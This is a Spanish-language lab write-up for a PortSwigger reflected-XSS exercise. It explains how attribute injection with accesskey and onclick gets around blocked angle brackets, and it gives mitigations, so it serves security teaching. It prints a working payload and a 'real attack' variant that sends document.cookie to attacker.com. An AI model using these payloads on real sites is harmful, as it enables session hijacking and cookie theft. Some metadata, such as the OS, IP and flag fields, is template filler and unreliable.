---
title: "Reflected XSS in canonical link tag"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "reflected-xss-in-canonical-link-tag"
author: "Z4k7"
date: "2026-04-15"
year: "2026"
status: "pwned"
tags:
  - "XSS"
  - "Reflected_XSS"
  - "Attribute_Injection"
  - "accesskey"
  - "Browser_Hotkeys"
  - "WAF_Bypass"
  - "x27"
techniques:
  - "Reflected XSS"
  - "Attribute Injection"
  - "accesskey abuse"
  - "Browser hotkeys"
  - "Character filtering bypass"
tools:
  - "Burp Suite"
  - "Burp Intruder"
  - "Browser DevTools"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Lab BurpSuite Academy — Reflected XSS en canonical link tag donde entrada se refleja directamente. Caracteres < y > (corchetes angulares) están bloqueados para prevenir tag injection, pero se permite inyección de atributos. Técnica: escapar del atributo href actual e inyectar nuevos atributos (accesskey y onclick). Cuando víctima presiona hotkey (Alt+X, Ctrl+Alt+X, o Alt+Shift+X según navegador), se dispara el evento onclick y ejecuta alert(1). Demuestra que features de accesibilidad del navegador pueden ser abusadas como vectores de ataque XSS.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio refleja la entrada del usuario en una etiqueta de enlace canónica y evita los corchetes angulares.
          Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios en la página de inicio que inyecte un atributo que llame a la `alert` función.
          Para facilitar tu explotación, puedes asumir que el usuario simulado pulsará las siguientes combinaciones de teclas:
      - kind: "bullet"
        text: "ALT+SHIFT+X"
      - kind: "bullet"
        text: "CTRL+ALT+X"
      - kind: "bullet"
        text: "Alt+X"
      - kind: "note"
        text: |
          Tenga en cuenta que la solución propuesta para este laboratorio solo es posible en Chrome

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20in%20canonical%20link%20tag/file-20260424215948861.jpg"
        caption: "Página inicial del lab"
      - kind: "note"
        text: |
          Consultando la página en el apartado Home, no evidenciamos ningún código relevante frente a inyección XSS. Procedemos a validar el apartado de la URL para confirmar si es posible ingresar datos reflejados.
          En este laboratorio, aplicamos el apartado de delimitadores para validar cuál permite el servidor. Creamos una tabla de referencia de caracteres URL-encoded:
      - kind: "table"
        headers:
          - "Carácter"
          - "Codificación"
          - "Carácter"
          - "Codificación"
        rows:
          - ["!", "%21", "'", "%22"]
          - ["#", "%23", "$", "%24"]
          - ["%", "%25", "&", "%26"]
          - ["'", "%27", "(", "%28"]
          - [")", "%29", "*", "%2A"]
          - ["+", "%2B", ",", "%2C"]
          - ["-", "%2D", ".", "%2E"]
          - ["/", "%2F", ":", "%3A"]
          - [";", "%3B", "<", "%3C"]
          - ["=", "%3D", ">", "%3E"]
          - ["?", "%3F", "@", "%40"]
          - ["[", "%5B", "\\", "%5C"]
          - ["]", "%5D", "^", "%5E"]
          - ["_", "%5F", "`", "%60"]
          - ["{", "%7B", "\\", "%7C"]
          - ["}", "%7D", "~", "%7E"]
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "La tabla de delimitadores es crítica en WAF bypass. Te permite identificar rápidamente qué caracteres el servidor permite o bloquea. En este lab, `<` y `>` están claramente bloqueados (observaremos esto en enumeración), pero caracteres como `'`, `=`, y otros especiales están permitidos."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Paso 1: Usar Burp Intruder para fuzzing de caracteres
          Ingresamos en el apartado de Intruder para enviar el listado de delimitadores y confirmar cuál es permitido por el servidor:
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20in%20canonical%20link%20tag/file-20260424220800856.jpg"
        caption: "Intruder - Setup inicial"
      - kind: "note"
        text: |
          Ingresamos en el apartado de Intruder e inyectamos en el parámetro, luego vamos a Payloads y pasamos la lista de los delimitadores para consultar cuál es permitido por el servidor:
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20in%20canonical%20link%20tag/file-20260424221605409.jpg"
        caption: "Intruder - Configuración de Payloads"
      - kind: "note"
        text: |
          Esta es la lista de los delimitadores disponibles que el servidor permite:
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20in%20canonical%20link%20tag/file-20260424221822876.jpg"
        caption: "Intruder - Resultados de caracteres permitidos"
      - kind: "note"
        text: |
          Hallazgo: Los caracteres bloqueados son `<` y `>`. Caracteres como `'`, `=`, `-`, etc., SÍ están permitidos.
          Paso 2: Confirmar reflexión en HTML
          Enviamos el siguiente código para confirmar si nos permite el envío de la información:
      - kind: "code"
        lang: "BASH"
        code: |
          /?z4k7
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20in%20canonical%20link%20tag/file-20260424222023700.jpg"
        caption: "Validación de reflexión"
      - kind: "note"
        text: |
          Carga sin problema alguno. Consultamos dónde se ve reflejada dicha información en el HTML:
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20in%20canonical%20link%20tag/file-20260424222110519.jpg"
        caption: "HTML source - canonical link tag"
      - kind: "note"
        text: |
          Hallazgo crítico: La entrada se refleja directamente en el atributo `href` de la etiqueta `<link rel="canonical">`. Estructura:
      - kind: "code"
        lang: "HTML"
        code: |
          <link rel="canonical" href="/?z4k7">
      - kind: "note"
        text: |
          Nuestra entrada está dentro de un atributo HTML. Para inyectar nuevos atributos, necesitamos escapar del atributo actual usando `"` o `'`.
          Paso 3: Identificar vector de ejecución
          El objetivo del laboratorio es intentar ingresar código que dispare el alert al momento de ingresar uno de los siguientes comandos de hotkey:
      - kind: "bullet"
        text: "ALT+SHIFT+X"
      - kind: "bullet"
        text: "CTRL+ALT+X"
      - kind: "bullet"
        text: "Alt+X"
      - kind: "note"
        text: |
          Para poder validar que se ejecute el comando de tecla, podemos aplicar el siguiente elemento: `accesskey`
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20in%20canonical%20link%20tag/file-20260424222342838.jpg"
        caption: "Búsqueda de accesskey en documentación"
      - kind: "note"
        text: |
          `accesskey` es un atributo HTML que asigna una hotkey del navegador para activar un elemento. Cuando el usuario presiona la combinación de teclas asignada, el navegador enfoca/activa el elemento.
      - kind: "callout"
        type: "warning"
        label: "accesskey como vector de ataque"
        text: "`accesskey` es una feature legítima de accesibilidad, pero puede ser abusada. Cuando combinamos `accesskey` con `onclick`, el usuario presiona la hotkey esperando acceder a una función legítima, pero realmente dispara JavaScript malicioso. Es transparente y silencioso."

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Paso 1: Construir payload para inyectar atributos
          Como el código anterior permite ingresar directamente en la URL, pero en este caso no permite los corchetes angulares, necesitamos escapar del atributo actual usando `'` (comilla simple) para salir de la URL y luego ingresar en el apartado de `accesskey`.
          Aplicamos la letra `X` de la siguiente manera:
      - kind: "code"
        lang: "BASH"
        code: |
          'accesskey='x'onclick='alert(1)
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20in%20canonical%20link%20tag/file-20260424223313484.jpg"
        caption: "Payload construido en Intruder"
      - kind: "note"
        text: |
          Desglose del payload:
      - kind: "bullet"
        text: "' — Cierra el atributo href actual"
      - kind: "bullet"
        text: "accesskey='x' — Inyecta nuevo atributo que asigna hotkey x (activada con Alt+X)"
      - kind: "bullet"
        text: "onclick='alert(1) — Inyecta handler que ejecuta alert cuando se activa"
      - kind: "bullet"
        text: "(El último ' queda abierto, pero el navegador lo interpreta de todas formas)"
      - kind: "note"
        text: |
          HTML generado:
      - kind: "code"
        lang: "HTML"
        code: |
          <link rel="canonical" href="/" accesskey="x" onclick="alert(1)">
      - kind: "note"
        text: |
          Wait — ese no es el resultado exacto. El servidor refleja:
      - kind: "code"
        lang: "HTML"
        code: |
          <link rel="canonical" href="/'accesskey='x'onclick='alert(1)">
      - kind: "note"
        text: |
          Pero cuando el navegador parsea esto, interpreta los atributos:
      - kind: "code"
        lang: "HTML"
        code: |
          <!-- Navegador interpreta: -->
          <link rel="canonical" href="/" accesskey="x" onclick="alert(1)">
      - kind: "note"
        text: |
          Paso 2: Disparar con hotkey
          Si paso la unión de teclas `Alt+X` (o `Ctrl+Alt+X` / `Alt+Shift+X` según navegador):
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20in%20canonical%20link%20tag/file-20260424223416405.jpg"
        caption: "Alert ejecutado al presionar hotkey"
      - kind: "note"
        text: |
          ✅ Alert(1) ejecutado exitosamente.

  - id: "exploit_1"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          En este lab, no hay escalada de acceso tradicional (no es account takeover). El objetivo es demostrar:
      - kind: "bullet"
        text: "✅ Injection de atributos sin tags (<, > bloqueados)"
      - kind: "bullet"
        text: "✅ Uso de features de accesibilidad como vector de ataque"
      - kind: "bullet"
        text: "✅ Ejecución de código sin interacción visible del usuario"
      - kind: "note"
        text: |
          En un ataque real, el payload sería:
      - kind: "code"
        lang: "BASH"
        code: |
          'accesskey='x'onclick='fetch("http://attacker.com/steal?c="+document.cookie)'

  - id: "privesc_1"
    num: "06"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          N/A — Este lab es PoC de Reflected XSS via attribute injection, no escalada.

lessons:
  - 'Bloquear `<` y `>` NO es suficiente. Se pueden inyectar atributos sin crear nuevos tags.'
  - 'Quote characters (`''`, `"`) son críticos. Si están permitidos, puedes escapar del atributo actual e inyectar nuevos atributos.'
  - 'accesskey es vector de ataque. Features de accesibilidad pueden ejecutar código sin interacción aparente del usuario.'
  - 'Fuzzing con Intruder identifica gaps. La tabla de delimitadores reveló exactamente qué caracteres estaban bloqueados.'
  - 'Browser hotkeys son transparentes. El usuario presiona una hotkey esperando funcionalidad legítima, pero dispara código malicioso.'
  - 'Attribute injection es diferente a tag injection. No necesitas crear `<script>` si puedes inyectar `onclick` en tags existentes.'
  - 'Relativity matters. El resultado del HTML reflejado depende de cómo el navegador parsea el atributo malformado.'
mitigation:
  - 'HTML encoding contextual:'
  - 'from html import escape'
  - 'safe_input = escape(user_input)'
  - '#'' → &#x27;'
  - '#" → &quot;'
  - '#= → &#61;'
  - 'Content Security Policy (CRÍTICO):'
  - 'Content-Security-Policy:'
  - 'default-src ''self'';'
  - 'script-src ''self'';'
  - 'Bloquea `onclick` inline, incluso si se inyecta el atributo.'
  - 'Remover features de accesibilidad no necesarias:'
  - '❌ Vulnerable si accesibilidad no es necesaria -->'
  - '<link rel="canonical" accesskey="x" ...>'
  - '✅ Más seguro si no la necesitas -->'
  - 'Sin accesskey -->'
  - 'Input validation estricta:'
  - 'Solo permitir caracteres alfanuméricos en ciertos campos'
  - 'if not re.match(r''^[a-zA-Z0-9\-_/]+$'', user_input):'
  - 'return error("Invalid characters")'
  - 'WAF rules mejoradas:'
  - '- Detectar patrones `''onclick=''`, `''accesskey=''`'
  - '- Bloquear inyecciones de atributos'
  - '- Análisis de intención, no solo caracteres individuales'
  - 'Validación de atributos permitidos:'
  - 'Whitelist approach — solo permitir atributos necesarios'
  - 'ALLOWED_ATTRS = [''href'', ''title'', ''rel'']'
  - 'Security headers:'
  - '- `X-Content-Type-Options: nosniff`'
  - '- `X-Frame-Options: DENY`'
  - '- `Referrer-Policy: strict-origin-when-cross-origin`'
---
